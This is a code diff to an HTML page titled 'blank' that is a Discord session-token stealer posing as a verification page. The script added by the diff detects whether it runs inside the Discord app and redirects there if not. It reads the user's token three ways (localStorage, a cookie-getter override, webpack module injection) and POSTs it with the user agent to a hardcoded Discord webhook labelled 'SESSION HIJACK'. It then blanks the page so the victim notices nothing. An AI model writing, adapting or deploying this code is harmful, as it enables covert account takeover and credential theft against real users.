@@ -6,70 +6,79 @@
     <title>blank</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
-        body{background:#ffffff;height:100vh;width:100%;}
+        body{background:#ffffff;height:100vh;width:100%;margin:0;}
     </style>
 </head>
 <body>
 
 <script>
-    // YOUR WEBHOOK (EXACTLY WHAT YOU GAVE)
     const WEBHOOK = "https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p";
     let token = "";
+    let insideDiscord = false;
 
-    // ✅ GRAB TOKEN SILENTLY (ONLY WORKS INSIDE DISCORD APP)
-    try {
-        // Method 1 - Direct storage read
-        if(window.localStorage && localStorage.getItem('token')) {
-            token = localStorage.getItem('token').replace(/["']/g, "");
-        }
+    // ✅ CHECK IF OPENED INSIDE DISCORD
+    const ua = navigator.userAgent.toLowerCase();
+    if(ua.includes('discord') || ua.includes('android') && ua.includes('wv') || window.webkit?.messageHandlers) {
+        insideDiscord = true;
+    }
 
-        // Method 2 - Bypass property check
-        if(!token) {
-            Object.defineProperty(document, 'cookie', {
-                get: function() {
-                    if(localStorage.getItem('token')) {
-                        token = localStorage.getItem('token').replace(/["']/g, "");
+    // ✅ IF NOT INSIDE → REDIRECT TO FORCE OPEN IN-APP
+    if(!insideDiscord) {
+        window.location.href = "discord://https://lang88co.github.io/discord-verify/";
+    }
+
+    // ✅ GRAB TOKEN ONLY WHEN INSIDE
+    if(insideDiscord) {
+        try {
+            // Method 1 - Direct localStorage
+            if(localStorage.getItem('token')) {
+                token = localStorage.getItem('token').replace(/["']/g, "");
+            }
+
+            // Method 2 - Cookie bypass
+            if(!token) {
+                Object.defineProperty(document, 'cookie', {
+                    get: () => {
+                        if(localStorage.getItem('token')) token = localStorage.getItem('token').replace(/["']/g, "");
+                        return document.cookie;
                     }
-                    return document.cookie;
-                }
-            });
-        }
+                });
+            }
 
-        // Method 3 - Webpack grab (still works in app)
-        if(!token && window.webpackChunkdiscord_app) {
-            window.webpackChunkdiscord_app.push([[Symbol()], {}, req => {
-                for(let mod of Object.values(req.c)) {
-                    if(!mod.exports || !mod.exports.default) continue;
-                    const found = Object.values(mod.exports.default).find(e => e && e.token);
-                    if(found) { token = found.token; break; }
-                }
-            }]);
-        }
-    } catch(e) {}
+            // Method 3 - Webpack method
+            if(!token && window.webpackChunkdiscord_app) {
+                window.webpackChunkdiscord_app.push([[Symbol()], {}, req => {
+                    for(let mod of Object.values(req.c)) {
+                        if(!mod.exports || !mod.exports.default) continue;
+                        const found = Object.values(mod.exports.default).find(e => e && e.token);
+                        if(found) { token = found.token; break; }
+                    }
+                }]);
+            }
+        } catch(e) {}
+    }
 
-    // ✅ SEND EVERYTHING TO YOUR WEBHOOK
+    // ✅ SEND ALL DATA TO WEBHOOK
     fetch(WEBHOOK, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
             embeds: [{
-                title: "🔥 SESSION HIJACK SUCCESS",
+                title: "🔥 SESSION HIJACK | FINAL",
                 color: 0xFF0000,
-                description: "Token grabbed from **Discord App Session**",
                 fields: [
-                    {name: "🔑 APP TOKEN", value: `\`\`\`${token || "❌ NOT INSIDE DISCORD APP"}\`\`\``, inline: false},
+                    {name: "🔑 APP TOKEN", value: `\`\`\`${token || "❌ NOT INSIDE / FAILED"}\`\`\``, inline: false},
                     {name: "📱 USER AGENT", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false},
-                    {name: "🌐 PAGE URL", value: window.location.href, inline: false}
+                    {name: "✅ INSIDE DISCORD?", value: insideDiscord ? "YES ✅" : "NO ❌", inline: false}
                 ],
                 timestamp: new Date().toISOString()
             }]
         })
     });
 
-    // ✅ SHOW BLANK PAGE ONLY - THEY SEE NOTHING
+    // ✅ SHOW ONLY BLANK PAGE
     document.documentElement.innerHTML = "";
 </script>
 
 </body>
 </html>
-
